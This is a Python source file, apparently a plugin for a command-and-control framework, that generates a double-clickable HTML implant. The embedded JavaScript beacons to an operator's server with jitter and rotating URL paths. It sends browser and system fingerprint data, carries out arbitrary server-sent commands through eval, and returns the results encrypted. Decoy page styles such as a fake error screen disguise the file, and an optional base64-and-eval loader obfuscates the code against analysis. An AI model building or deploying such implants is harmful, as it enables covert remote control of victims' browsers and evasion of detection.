from plugins.agent_plugin_interface import AgentPluginInterface
import os
import base64
import json
import datetime
import random
import string

class HTMLAgentPlugin(AgentPluginInterface):
    """HTML-based agent plugin that creates an HTML file for browser execution"""
    
    @classmethod
    def get_name(cls) -> str:
        """Return the name of this agent type for UI display"""
        return "HTML"
    
    @classmethod
    def get_description(cls) -> str:
        """Return a description of this agent type"""
        return "An HTML file-based agent that runs in web browsers with JavaScript. Double-clickable and does not require special permissions."
    
    @classmethod
    def get_options(cls) -> dict:
        """Return configuration options for HTML agent"""
        return {
            "beacon_period": {
                "type": "int",
                "default": 30,
                "description": "Beacon interval in seconds - how often the agent checks in",
                "required": True
            },
            "jitter_percentage": {
                "type": "int",
                "default": 20,
                "description": "Random variation in beacon timing (percentage)",
                "required": True
            },
            "websocket_fallback": {
                "type": "bool",
                "default": False,
                "description": "Use WebSockets as fallback when AJAX fails",
                "required": False
            },
            "user_agent": {
                "type": "string",
                "default": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                "description": "User-Agent string for HTTP requests",
                "required": False
            },
            "page_title": {
                "type": "string",
                "default": "System Information",
                "description": "Title for the HTML page",
                "required": False
            },
            "appearance": {
                "type": "list",
                "default": "corporate",
                "description": "Visual style of the HTML page",
                "required": False,
                "values": ["corporate", "minimal", "error", "loading", "blank"]
            },
            "format": {
                "type": "list",
                "default": "html",
                "description": "Output format for the agent",
                "required": False,
                "values": ["html", "obfuscated"]
            }
        }
    
    @classmethod
    def get_agent_capabilities(cls) -> list:
        """Return capabilities supported by HTML agent"""
        return [
            "system_information", 
            "dynamic_path_rotation", 
            "secure_key_exchange",
            "command_execution",
            "browser_based"
        ]
    
    @classmethod
    def get_supported_platforms(cls) -> list:
        """Return platforms supported by HTML agent"""
        return ["windows", "linux", "macos", "android", "ios"]  # Any platform with a browser
    
    @classmethod
    def generate(cls, config: dict, campaign_settings: dict) -> dict:
        """
        Generate the HTML agent using the provided configuration
        
        Args:
            config: Dictionary containing plugin-specific configuration
            campaign_settings: Dictionary containing campaign-wide settings
            
        Returns:
            Dictionary containing:
                "code": Generated agent code
                "files": List of file paths generated (if any)
                "instructions": User instructions
                "summary": Short summary of what was generated
        """
        # Validate configuration
        errors = cls.validate_config(config)
        if errors:
            error_msg = "\n".join([f"{key}: {', '.join(msgs)}" for key, msgs in errors.items()])
            raise ValueError(f"Configuration validation failed:\n{error_msg}")
        
        # Extract configuration values
        beacon_interval = config.get("beacon_period", 30)
        jitter_percentage = config.get("jitter_percentage", 20)
        websocket_fallback = config.get("websocket_fallback", False)
        user_agent = config.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        page_title = config.get("page_title", "System Information")
        appearance = config.get("appearance", "corporate")
        output_format = config.get("format", "html")
        
        # Extract campaign settings
        server_address = campaign_settings.get("server_address", "")
        rotation_info = campaign_settings.get("rotation_info", None)
        ssl_enabled = campaign_settings.get("ssl_enabled", False)
        
        # Generate HTML agent code
        html_agent = cls._generate_html_agent(
            server_address=server_address,
            beacon_interval=beacon_interval,
            jitter_percentage=jitter_percentage,
            websocket_fallback=websocket_fallback,
            user_agent=user_agent,
            page_title=page_title,
            appearance=appearance,
            rotation_info=rotation_info,
            ssl_enabled=ssl_enabled
        )
        
        # Obfuscate if requested
        if output_format == "obfuscated":
            html_agent = cls._obfuscate_html(html_agent)
        
        # Save to file if campaign folder is provided
        files = []
        if "campaign_folder" in campaign_settings:
            campaign_folder = campaign_settings["campaign_folder"]
            agents_folder = os.path.join(campaign_folder, "agents")
            os.makedirs(agents_folder, exist_ok=True)
            
            # Save HTML agent file
            file_name = f"agent_{cls._generate_random_string(6)}.html"
            file_path = os.path.join(agents_folder, file_name)
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(html_agent)
            files.append(file_path)
        
        # Prepare result
        instructions = (
            "Double-click the HTML file to open it in the default browser. "
            "The agent will establish a connection to your C2 server "
            f"at {campaign_settings.get('server_address', 'UNKNOWN')}. "
            f"The page will appear as a {appearance} style interface to blend in."
        )
            
        summary = (
            f"HTML agent generated with {beacon_interval}s beacon interval, "
            f"{jitter_percentage}% jitter, and a {appearance} appearance. "
            f"{'WebSocket fallback enabled.' if websocket_fallback else 'Using AJAX for communication.'}"
        )
            
        result = {
            "code": html_agent,
            "files": files,
            "instructions": instructions,
            "summary": summary
        }
        
        return result
    
    @classmethod
    def _generate_html_agent(cls, server_address, beacon_interval, jitter_percentage, 
                           websocket_fallback, user_agent, page_title, appearance,
                           rotation_info, ssl_enabled):
        """Generate the HTML agent code"""
        # Setup the protocol based on SSL config
        protocol = "https" if ssl_enabled else "http"
        
        # Generate the basic HTML structure based on appearance
        html_template = cls._get_html_template(appearance, page_title)
        
        # Generate the JavaScript for agent functionality
        agent_js = cls._get_agent_javascript(
            server_address=server_address,
            protocol=protocol,
            beacon_interval=beacon_interval,
            jitter_percentage=jitter_percentage,
            websocket_fallback=websocket_fallback,
            user_agent=user_agent,
            rotation_info=rotation_info
        )
        
        # Insert the JavaScript into the HTML template
        # FIX: Properly replace the template placeholder with actual JavaScript code
        html_agent = html_template.replace('{AGENT_SCRIPT}', agent_js)
        
        # Add timestamp and metadata as an HTML comment
        metadata = f"""
<!-- 
    Kinetic Compliance Matrix - HTML Agent
    Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    Beacon Interval: {beacon_interval}s
    Jitter: {jitter_percentage}%
    WebSocket Fallback: {websocket_fallback}
-->
"""
        html_agent = metadata + html_agent
        
        return html_agent
    
    @classmethod
    def _get_html_template(cls, appearance, page_title):
        """Get the HTML template based on appearance style"""
        if appearance == "corporate":
            return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{page_title}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }}
        .container {{
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        header {{
            padding-bottom: 10px;
            margin-bottom: 20px;
            border-bottom: 1px solid #eee;
        }}
        h1 {{
            color: #333;
            margin: 0;
        }}
        .loading {{
            display: block;
            width: 100%;
            text-align: center;
            padding: 20px;
            font-style: italic;
            color: #666;
        }}
        .content {{
            padding: 15px;
        }}
        .hidden {{
            display: none;
        }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>{page_title}</h1>
        </header>
        <div class="loading">
            Loading information, please wait...
        </div>
        <div class="content hidden">
            <h2>System Information</h2>
            <div id="systemInfo">
                <p>Gathering system information...</p>
            </div>
            <h2>Status</h2>
            <div id="status">
                <p>Initializing...</p>
            </div>
        </div>
    </div>
    <script>
        {{AGENT_SCRIPT}}
    </script>
</body>
</html>"""
        elif appearance == "minimal":
            return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{page_title}</title>
    <style>
        body {{
            font-family: sans-serif;
            margin: 0;
            padding: 10px;
        }}
    </style>
</head>
<body>
    <h3>{page_title}</h3>
    <div id="content">Loading...</div>
    <script>
        {{AGENT_SCRIPT}}
    </script>
</body>
</html>"""
        elif appearance == "error":
            return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error - {page_title}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f8f8f8;
        }}
        .error-container {{
            max-width: 600px;
            margin: 50px auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            border-left: 5px solid #cc0000;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        h1 {{
            color: #cc0000;
            margin-top: 0;
        }}
        .error-code {{
            color: #888;
            font-family: monospace;
            margin: 20px 0;
            padding: 10px;
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 3px;
        }}
        .hidden {{
            display: none;
        }}
    </style>
</head>
<body>
    <div class="error-container">
        <h1>An error has occurred</h1>
        <p>The application has encountered an unexpected error and cannot continue.</p>
        <div class="error-code">
            Error Code: 0x80072EE7<br>
            Process ID: 4328<br>
            Session ID: UZVWX4827
        </div>
        <p>Please contact your system administrator for assistance.</p>
    </div>
    <script>
        {{AGENT_SCRIPT}}
    </script>
</body>
</html>"""
        elif appearance == "loading":
            return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{page_title}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f8f8f8;
        }}
        .loader {{
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .loading-container {{
            text-align: center;
        }}
        .loading-text {{
            margin-top: 20px;
            color: #666;
        }}
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="loader"></div>
        <div class="loading-text">Loading {page_title}...</div>
    </div>
    <script>
        {{AGENT_SCRIPT}}
    </script>
</body>
</html>"""
        else:  # blank
            return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{page_title}</title>
</head>
<body>
    <script>
        {{AGENT_SCRIPT}}
    </script>
</body>
</html>"""
    
    @classmethod
    def _get_agent_javascript(cls, server_address, protocol, beacon_interval, 
                            jitter_percentage, websocket_fallback, user_agent,
                            rotation_info):
        """Generate the JavaScript for the agent functionality"""
        # Extract rotation info safely
        current_rotation_id = 0
        next_rotation_time = 0
        rotation_interval = 3600
        path_pool = []
        
        if rotation_info:
            current_rotation_id = rotation_info.get('current_rotation_id', 0)
            next_rotation_time = rotation_info.get('next_rotation_time', 0)
            rotation_interval = rotation_info.get('rotation_interval', 3600)
            
            if 'current_paths' in rotation_info and 'path_pool' in rotation_info['current_paths']:
                path_pool = rotation_info['current_paths']['path_pool']
        
        # Create the JavaScript for the agent
        js_code = f"""
// Kinetic Compliance Matrix - HTML Agent
// Configuration
const config = {{
    serverAddress: '{server_address}',
    protocol: '{protocol}',
    beaconInterval: {beacon_interval},
    jitterPercentage: {jitter_percentage},
    useWebSocketFallback: {str(websocket_fallback).lower()},
    userAgent: '{user_agent}'
}};

// Path rotation configuration
let pathRotationEnabled = true;
let currentRotationId = {current_rotation_id};
let nextRotationTime = {next_rotation_time};
let rotationInterval = {rotation_interval};

// Path pool for dynamic path selection
let pathPool = {json.dumps(path_pool)};
if (pathPool.length === 0) {{
    // Default dummy paths in case pool is empty
    pathPool = ['/api/status', '/content/data', '/assets/info'];
}}

// Encryption variables
let encryptionKey = null;
let clientId = null;
let firstContact = true;
let keyRegistered = false;

// Utility functions
function generateRandomToken(length) {{
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {{
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }}
    return result;
}}

function getRandomPath() {{
    if (pathPool.length === 0) {{
        return '/api/endpoint';
    }}
    return pathPool[Math.floor(Math.random() * pathPool.length)];
}}

function addJitter(interval) {{
    const jitter = (Math.random() * 2 - 1) * (interval * config.jitterPercentage / 100);
    return interval + jitter;
}}

// System Information Gathering
function getSystemInformation() {{
    const info = {{
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookiesEnabled: navigator.cookieEnabled,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight,
        timeZoneOffset: new Date().getTimezoneOffset(),
        referrer: document.referrer,
        battery: null,
        location: null
    }};
    
    // Try to get battery info if available
    if (navigator.getBattery) {{
        navigator.getBattery().then(function(battery) {{
            info.battery = {{
                charging: battery.charging,
                level: battery.level * 100
            }};
        }});
    }}
    
    return info;
}}

// Encryption functions
async function generateAESKey() {{
    // Generate a random AES-256 key
    const key = await crypto.subtle.generateKey(
        {{ name: 'AES-GCM', length: 256 }},
        true,
        ['encrypt', 'decrypt']
    );
    
    return key;
}}

async function encryptData(data, key) {{
    // If no key is available yet, return data as-is
    if (!key) return data;
    
    try {{
        // Convert data to string if it's not already
        const dataString = (typeof data === 'string') ? data : JSON.stringify(data);
        const encoder = new TextEncoder();
        const dataBytes = encoder.encode(dataString);
        
        // Generate random IV
        const iv = crypto.getRandomValues(new Uint8Array(12));
        
        // Encrypt the data
        const encryptedContent = await crypto.subtle.encrypt(
            {{ name: 'AES-GCM', iv: iv }},
            key,
            dataBytes
        );
        
        // Combine IV and encrypted content
        const result = new Uint8Array(iv.length + encryptedContent.byteLength);
        result.set(iv);
        result.set(new Uint8Array(encryptedContent), iv.length);
        
        // Convert to Base64
        return btoa(String.fromCharCode.apply(null, result));
    }} catch (error) {{
        console.error('Encryption error:', error);
        return data; // Return original data if encryption fails
    }}
}}

async function decryptData(encryptedBase64, key) {{
    // If no key is available yet, return data as-is
    if (!key) return encryptedBase64;
    
    try {{
        // Decode Base64
        const binaryString = atob(encryptedBase64);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {{
            bytes[i] = binaryString.charCodeAt(i);
        }}
        
        // Extract IV (first 12 bytes) and encrypted data
        const iv = bytes.slice(0, 12);
        const encryptedData = bytes.slice(12);
        
        // Decrypt the data
        const decryptedContent = await crypto.subtle.decrypt(
            {{ name: 'AES-GCM', iv: iv }},
            key,
            encryptedData
        );
        
        // Convert to string
        const decoder = new TextDecoder();
        return decoder.decode(decryptedContent);
    }} catch (error) {{
        console.error('Decryption error:', error);
        return encryptedBase64; // Return original data if decryption fails
    }}
}}

// Key Registration - PKI Exchange
async function exportPublicKey(key) {{
    // Export the public key as SPKI
    const exported = await crypto.subtle.exportKey(
        "spki", 
        key
    );
    
    // Convert to base64
    return btoa(String.fromCharCode.apply(null, new Uint8Array(exported)));
}}

async function exportAESKey(key) {{
    // Export AES key to raw bytes
    const exported = await crypto.subtle.exportKey(
        "raw", 
        key
    );
    
    // Convert to base64
    return btoa(String.fromCharCode.apply(null, new Uint8Array(exported)));
}}

async function encryptKeyWithRSA(aesKey, rsaPublicKey) {{
    // Export the AES key to raw bytes
    const exportedAES = await crypto.subtle.exportKey(
        "raw", 
        aesKey
    );
    
    // Encrypt the AES key with the RSA public key
    const encryptedKey = await crypto.subtle.encrypt(
        {{
            name: "RSA-OAEP"
        }},
        rsaPublicKey,
        exportedAES
    );
    
    // Convert to base64
    return btoa(String.fromCharCode.apply(null, new Uint8Array(encryptedKey)));
}}

async function importRSAPublicKey(base64Key) {{
    // Decode the base64 key
    const binaryString = atob(base64Key);
    const bytes = new Uint8Array(binaryString.length);
    for (let i = 0; i < binaryString.length; i++) {{
        bytes[i] = binaryString.charCodeAt(i);
    }}
    
    // Import as RSA public key
    return await crypto.subtle.importKey(
        "spki",
        bytes,
        {{
            name: "RSA-OAEP",
            hash: {{ name: "SHA-256" }}
        }},
        false,
        ["encrypt"]
    );
}}

async function registerClientKey(encryptedKey, clientId) {{
    try {{
        // Create registration request - MATCH THE FORMAT EXPECTED BY THE SERVER
        const registrationData = {{
            encrypted_key: encryptedKey,
            client_id: clientId,
            nonce: generateRandomToken(16)  // Random nonce for replay protection
        }};
        
        // Convert to JSON
        const registrationJson = JSON.stringify(registrationData);
        
        // THIS IS CRITICAL - Use the dedicated registration endpoint
        const registrationUrl = `${{config.protocol}}://${{config.serverAddress}}/client/service/registration`;
        
        console.log(`Sending key registration to ${{registrationUrl}}`);
        
        // Send the registration request
        const response = await fetch(registrationUrl, {{
            method: 'POST',
            headers: {{
                'Content-Type': 'application/json',
                'User-Agent': config.userAgent
            }},
            body: registrationJson
        }});
        
        if (!response.ok) {{
            throw new Error(`HTTP error: ${{response.status}}`);
        }}
        
        const responseData = await response.json();
        return responseData.status === "success";
    }} catch (error) {{
        console.error("Key registration error:", error);
        return false;
    }}
}}

// Process server's public key and initiate key exchange
async function processServerPublicKey(publicKeyBase64) {{
    console.log("Processing server public key...");
    
    try {{
        // Import the server's public key
        const serverPublicKey = await importRSAPublicKey(publicKeyBase64);
        if (!serverPublicKey) {{
            console.error("Failed to import server public key");
            return false;
        }}
        
        console.log("Successfully imported server's public key");
        
        // Generate a secure client AES key
        encryptionKey = await generateAESKey();
        if (!encryptionKey) {{
            console.error("Failed to generate client AES key");
            return false;
        }}
        
        console.log("Generated client AES key");
        
        // Encrypt the client key with server's public key
        const encryptedKey = await encryptKeyWithRSA(encryptionKey, serverPublicKey);
        if (!encryptedKey) {{
            console.error("Failed to encrypt client key");
            return false;
        }}
        
        console.log("Encrypted client key with server's public key");
        
        // Register the key with the server
        const registrationResult = await registerClientKey(encryptedKey, clientId);
        
        if (registrationResult) {{
            keyRegistered = true;
            console.log("Successfully registered client key with server");
            return true;
        }} else {{
            console.error("Failed to register client key with server");
            return false;
        }}
    }} catch (error) {{
        console.error("Error in processServerPublicKey:", error);
        return false;
    }}
}}

// Communication functions
async function sendBeacon(systemInfo) {{
    // Select a random path
    const beaconPath = getRandomPath();
    const fullUrl = `${{config.protocol}}://${{config.serverAddress}}${{beaconPath}}`;
    
    // Create operation payload
    const operationPayload = {{
        op_type: 'beacon',
        payload: systemInfo
    }};
    
    // Convert to JSON
    const operationJson = JSON.stringify(operationPayload);
    
    // Encrypt the data if we have a key
    const encryptedData = await encryptData(operationJson, encryptionKey);
    
    // Create the request payload
    const requestPayload = {{
        d: encryptedData,
        t: generateRandomToken(50 + Math.floor(Math.random() * 450))
    }};
    
    // Add client ID only during first contact
    if (firstContact && clientId) {{
        requestPayload.c = clientId;
    }}
    
    // Convert to JSON
    const requestJson = JSON.stringify(requestPayload);
    
    // Create fetch options
    const fetchOptions = {{
        method: 'POST',
        headers: {{
            'Content-Type': 'application/json',
            'User-Agent': config.userAgent
        }},
        body: requestJson
    }};
    
    try {{
        const response = await fetch(fullUrl, fetchOptions);
        if (!response.ok) {{
            throw new Error(`HTTP error: ${{response.status}}`);
        }}
        
        const responseData = await response.text();
        
        // Try to parse as JSON
        try {{
            const responseJson = JSON.parse(responseData);
            
            // Check for first contact flags
            if (responseJson.f) {{
                firstContact = false;
                
                // Save client ID if provided
                if (responseJson.c) {{
                    clientId = responseJson.c;
                    console.log(`Client ID assigned: ${{clientId}}`);
                }}
                
                // Check for server public key
                if (responseJson.pubkey) {{
                    // Process the server's public key and initiate key exchange
                    await processServerPublicKey(responseJson.pubkey);
                }}
            }}
            
            // Check for path rotation info
            if (responseJson.r) {{
                const rotationInfo = responseJson.r;
                if (rotationInfo.cid !== undefined && rotationInfo.nrt !== undefined) {{
                    currentRotationId = rotationInfo.cid;
                    nextRotationTime = rotationInfo.nrt;
                    console.log(`Updated rotation info - ID: ${{rotationInfo.cid}}, Next rotation: ${{new Date(rotationInfo.nrt * 1000).toLocaleString()}}`);
                }}
            }}
            
            // Process commands if available
            if (responseJson.com) {{
                let commands = responseJson.com;
                
                // Check if commands are encrypted
                if (responseJson.e && encryptionKey) {{
                    // Decrypt the commands
                    const decryptedCommands = await decryptData(commands, encryptionKey);
                    try {{
                        commands = JSON.parse(decryptedCommands);
                    }} catch (e) {{
                        console.error('Error parsing decrypted commands:', e);
                    }}
                }}
                
                // Process each command
                if (Array.isArray(commands)) {{
                    for (const command of commands) {{
                        processCommand(command);
                    }}
                }}
            }}
            
            return true;
        }} catch (e) {{
            console.error('Error parsing response:', e);
            return false;
        }}
    }} catch (error) {{
        console.error('Beacon error:', error);
        
        // Try WebSocket fallback if enabled
        if (config.useWebSocketFallback) {{
            tryWebSocketFallback(systemInfo);
        }}
        
        return false;
    }}
}}

async function tryWebSocketFallback(data) {{
    // Implementation of WebSocket fallback would go here
    console.log('Attempting WebSocket fallback');
}}

async function sendCommandResult(timestamp, result) {{
    // Select a random path for sending results
    const resultPath = getRandomPath();
    const fullUrl = `${{config.protocol}}://${{config.serverAddress}}${{resultPath}}`;
    
    // Create result object
    const resultObj = {{
        timestamp: timestamp,
        result: result
    }};
    
    // Create the operation payload
    const operationPayload = {{
        op_type: 'result',
        payload: resultObj
    }};
    
    // Convert to JSON
    const operationJson = JSON.stringify(operationPayload);
    
    // Encrypt the data
    const encryptedData = await encryptData(operationJson, encryptionKey);
    
    // Create the request payload
    const requestPayload = {{
        d: encryptedData,
        t: generateRandomToken(50 + Math.floor(Math.random() * 450))
    }};
    
    // Convert to JSON
    const requestJson = JSON.stringify(requestPayload);
    
    // Send the result
    try {{
        const response = await fetch(fullUrl, {{
            method: 'POST',
            headers: {{
                'Content-Type': 'application/json',
                'User-Agent': config.userAgent
            }},
            body: requestJson
        }});
        
        if (!response.ok) {{
            throw new Error(`HTTP error: ${{response.status}}`);
        }}
        
        console.log('Command result sent successfully');
        return true;
    }} catch (error) {{
        console.error('Error sending command result:', error);
        return false;
    }}
}}

// Command handling
async function processCommand(command) {{
    const timestamp = command.timestamp;
    const commandType = command.command_type;
    const args = command.args;
    
    console.log(`Processing command: ${{commandType}}`);
    
    let result = '';
    
    // Handle different command types
    switch (commandType) {{
        case 'execute':
            // Execute JavaScript code (dangerous but powerful)
            try {{
                result = eval(args);
                if (result === undefined) result = 'Command executed successfully (no output)';
                if (typeof result !== 'string') result = JSON.stringify(result);
            }} catch (e) {{
                result = `Error executing command: ${{e.message}}`;
            }}
            break;
            
        case 'system_info_request':
            // Gather detailed system information
            result = JSON.stringify(getSystemInformation());
            break;
            
        case 'path_rotation':
            // Update path rotation information
            try {{
                const rotationArgs = JSON.parse(args);
                if (rotationArgs.rotation_id !== undefined) {{
                    currentRotationId = rotationArgs.rotation_id;
                }}
                if (rotationArgs.next_rotation_time !== undefined) {{
                    nextRotationTime = rotationArgs.next_rotation_time;
                }}
                if (rotationArgs.paths && rotationArgs.paths.path_pool) {{
                    pathPool = rotationArgs.paths.path_pool;
                }}
                result = `Path rotation updated: ID ${{currentRotationId}}, next rotation at ${{new Date(nextRotationTime * 1000).toLocaleString()}}`;
            }} catch (e) {{
                result = `Path rotation failed: ${{e.message}}`;
            }}
            break;
            
        case 'browser_info':
            // Gather browser-specific information
            const browserInfo = {{
                userAgent: navigator.userAgent,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                platform: navigator.platform,
                cookiesEnabled: navigator.cookieEnabled,
                language: navigator.language,
                onLine: navigator.onLine,
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                screen: {{
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                }},
                plugins: Array.from(navigator.plugins).map(p => ({{
                    name: p.name,
                    description: p.description,
                    filename: p.filename
                }}))
            }};
            result = JSON.stringify(browserInfo);
            break;
            
        default:
            result = `Unknown command type: ${{commandType}}`;
    }}
    
    // Send the result back to the server
    await sendCommandResult(timestamp, result);
}}

// Main agent loop
async function startAgentLoop() {{
    // Initialize encryption
    clientId = generateRandomToken(8);
    console.log(`Generated initial client ID: ${{clientId}}`);
    
    // Main loop
    async function agentLoop() {{
        try {{
            const systemInfo = getSystemInformation();
            
            // First contact beacon handling
            if (firstContact) {{
                console.log("First contact with server, initiating secure key exchange");
                
                // Create a simplified initial beacon for first contact
                const initialBeacon = {{
                    // We're not encrypting this first message
                    c: clientId,  // Include client ID
                    f: true,      // Flag this as first contact
                    d: JSON.stringify(systemInfo),  // Include basic system info
                    t: generateRandomToken(50)  // Add token padding
                }};
                
                // Use a random path from the pool
                const beaconPath = getRandomPath();
                const fullUrl = `${{config.protocol}}://${{config.serverAddress}}${{beaconPath}}`;
                
                console.log(`Sending first contact beacon to ${{fullUrl}}`);
                
                try {{
                    const response = await fetch(fullUrl, {{
                        method: 'POST',
                        headers: {{
                            'Content-Type': 'application/json',
                            'User-Agent': config.userAgent
                        }},
                        body: JSON.stringify(initialBeacon)
                    }});
                    
                    // Log raw response
                    console.log(`First contact response status: ${{response.status}}`);
                    const responseText = await response.text();
                    console.log(`First contact response body: ${{responseText}}`);
                    
                    // Try to parse as JSON
                    try {{
                        const responseData = JSON.parse(responseText);
                        console.log("Parsed response data:", responseData);
                        
                        // Check for server's public key
                        if (responseData.pubkey) {{
                            console.log("Found public key in response:", responseData.pubkey.substring(0, 20) + "...");
                            
                            // Process the server's public key - this will register our key
                            const keyExchangeResult = await processServerPublicKey(responseData.pubkey);
                            console.log("Key exchange result:", keyExchangeResult);
                            
                            // After successful key registration, we're no longer in first contact
                            if (keyExchangeResult) {{
                                firstContact = false;
                            }}
                        }} else {{
                            console.error("No public key found in server response!");
                        }}
                        
                        // Update client ID if provided
                        if (responseData.c) {{
                            clientId = responseData.c;
                            console.log(`Server assigned client ID: ${{clientId}}`);
                        }}
                    }} catch (jsonError) {{
                        console.error("Error parsing response as JSON:", jsonError);
                    }}
                }} catch (fetchError) {{
                    console.error("Error making first contact request:", fetchError);
                }}
            }} else {{
                // Normal beacon for established connection
                await sendBeacon(systemInfo);
            }}
            
            // Schedule the next beacon with jitter
            const interval = addJitter(config.beaconInterval * 1000);
            console.log(`Next beacon in ${{interval / 1000}} seconds`);
            setTimeout(agentLoop, interval);
        }} catch (error) {{
            console.error('Error in agent loop:', error);
            // Schedule retry after error
            setTimeout(agentLoop, 5000);
        }}
    }}
    
    // Start the loop
    agentLoop();
}}

// Initialize and start the agent
document.addEventListener('DOMContentLoaded', function() {{
    // Hide the page content after a brief delay to make it look more natural
    setTimeout(function() {{
        // Try to find and update UI elements if they exist
        const loadingElement = document.querySelector('.loading');
        const contentElement = document.querySelector('.content');
        const statusElement = document.getElementById('status');
        const systemInfoElement = document.getElementById('systemInfo');
        
        if (loadingElement) {{
            loadingElement.style.display = 'none';
        }}
        
        if (contentElement) {{
            contentElement.classList.remove('hidden');
        }}
        
        if (statusElement) {{
            statusElement.innerHTML = '<p>Connected</p>';
        }}
        
        if (systemInfoElement) {{
            const info = getSystemInformation();
            let infoHTML = '<ul>';
            for (const [key, value] of Object.entries(info)) {{
                if (typeof value !== 'object' || value === null) {{
                    infoHTML += `<li><strong>${{key}}:</strong> ${{value}}</li>`;
                }}
            }}
            infoHTML += '</ul>';
            systemInfoElement.innerHTML = infoHTML;
        }}
    }}, 1500);
    
    // Start the agent loop
    startAgentLoop();
}});
"""
        return js_code
    
    @classmethod
    def _obfuscate_html(cls, html_content):
        """Obfuscate the HTML content to make analysis harder"""
        # Split into HTML and JS parts
        script_start = html_content.find("<script>")
        script_end = html_content.find("</script>", script_start)
        
        if script_start == -1 or script_end == -1:
            return html_content  # Can't find script tags, return as-is
        
        html_before = html_content[:script_start + 8]  # Include <script>
        js_code = html_content[script_start + 8:script_end]
        html_after = html_content[script_end:]
        
        # Basic JS obfuscation - You can implement more sophisticated obfuscation here
        # This is just a simple example to show the concept
        
        # 1. Encode strings
        js_lines = js_code.split('\n')
        obfuscated_lines = []
        
        for line in js_lines:
            # Skip comments and empty lines
            if line.strip().startswith('//') or not line.strip():
                continue
                
            # Keep the line but replace certain patterns
            obfuscated_line = line
            
            # Replace certain function names
            obfuscated_line = obfuscated_line.replace('getSystemInformation', '_gSI')
            obfuscated_line = obfuscated_line.replace('generateRandomToken', '_gRT')
            obfuscated_line = obfuscated_line.replace('encryptData', '_eD')
            obfuscated_line = obfuscated_line.replace('decryptData', '_dD')
            obfuscated_line = obfuscated_line.replace('sendBeacon', '_sB')
            obfuscated_line = obfuscated_line.replace('processCommand', '_pC')
            obfuscated_line = obfuscated_line.replace('startAgentLoop', '_sAL')
            
            obfuscated_lines.append(obfuscated_line)
        
        # Join back into a single string
        obfuscated_js = '\n'.join(obfuscated_lines)
        
        # 2. Use eval to load core functionality
        encoded_js = base64.b64encode(obfuscated_js.encode('utf-8')).decode('utf-8')
        
        loader_js = f"""
// Loader script
(function() {{
    const _x = atob("{encoded_js}");
    eval(_x);
}})();
"""
        
        # Reassemble HTML with obfuscated JS
        return html_before + loader_js + html_after
    
    @classmethod
    def _generate_random_string(cls, length=8):
        """Generate a random string of specified length"""
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))